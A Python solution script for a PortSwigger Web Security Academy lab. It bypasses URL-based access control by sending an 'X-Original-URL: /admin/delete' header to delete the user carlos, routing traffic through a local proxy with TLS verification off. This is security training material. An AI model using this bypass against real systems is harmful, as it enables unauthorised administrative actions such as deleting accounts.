#!/usr/bin/env python3
# Lab: URL-based access control can be circumvented
# Lab-Link: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    # client.get(host)  # just in case an active session is required
    url = f'{host}/?username=carlos'
    header = {'X-Original-URL': '/admin/delete'}
    client.get(url, headers=header)

    if 'Congratulations, you solved the lab!' in client.get(host).text:
        print(f'[+] Successfully deleted user carlos')
    else:
        print(f'[-] Failed to delete user carlos')


if __name__ == "__main__":
    main()
